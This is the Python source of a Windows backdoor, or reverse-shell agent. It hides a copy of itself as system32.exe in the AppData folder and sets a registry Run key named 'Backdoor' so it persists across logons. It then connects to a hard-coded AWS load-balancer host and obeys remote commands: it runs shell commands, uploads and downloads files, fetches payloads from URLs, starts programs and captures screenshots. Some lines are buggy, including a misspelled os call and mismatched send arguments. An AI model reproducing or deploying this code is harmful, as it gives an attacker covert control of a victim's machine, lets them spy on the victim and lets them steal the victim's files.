#!/usr/bin/python 

import socket 
import subprocess
import json
import os
import base64
import shutil
from shutil import copyfile
import sys
import requests
from mss import mss

# The send and receive data functions - gets JSON
def my_send(data):
        json_data = json.dumps(data)
        sock.send(data)
def my_recv():
        data = ""
        while True:
                try:
                        data = data + sock.recv(1024)
                        return json.loads(data)
                except ValueError:
                        continue

# This function called in order capture a printscreen 
def screenshot():
	with mss() as screenshot:
		screenshot.shot()

#This function called in order to get files from URL www.example.com/filename.exe
def download(url):
	get_url = requests.get(url)
	file_name = url.split("/")[-1]
	with open(file_name, "wb") as out_file:
		out_file.write(get_url.content)

# This function called for the shell commands 
def shell():
        while True:
                command = my_recv()
                if command == 'q':
                        break
                elif command[:2] == "cd" and len(command) > 1:
                     try:
                        os.chdir(command[3:])
                     except:
                             continue
                elif command[:8] == "download":
                        with open(command[9:], "rb") as file:
                                my_send(base64.b64encode(file.read()))
                elif command[:6] == "upload":
                        with open(command[7:], "wb") as file2:
                                file_data = my_recv()
                                file2.write(base64.b64decode(file_data))
		elif command[:3] == "get":
			try:
				download(command[4:])
				my_send("[+] Download file from url started")
			except:
				my_send("[+] Failed to download")
		elif command[:10] == "screenshot":
			try:
				screenshot()
				with open("monitor-1.png", "rb") as file_shot :
					my_send(base64.b64encode, file_shot.read())
				os.remnove("monitor-1.png")
			except:
				my_send("[!!] Failed to take screenshot")
		elif command[:5] == "start":
			try: 
				subprocess.Popen(command[6:], shell=True)
				my_send("[+] Started!")
			except:
				my_send("[!!] Failed to start") 
                else:
                       proc=subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                       result = proc.stdout.read() + proc.stderr.read()
                       my_send(result)

# The agent achive stickness and persistent hidden in the appdata and injected into the # The agent achive stickness and persistent hidden in the appdata registry
location  = os.environ["appdata"] + "\\system32.exe"
if not os.path.exists(location):
	shutil.copyfile(sys.executable,location)
	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location +'"', shell=True)
HOST = 'agentLB-e9d579b2e376ded2.elb.us-west-2.amazonaws.com' #connecting to Load balancer
PORT = 54436
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((HOST, PORT))
shell()
sock.close()


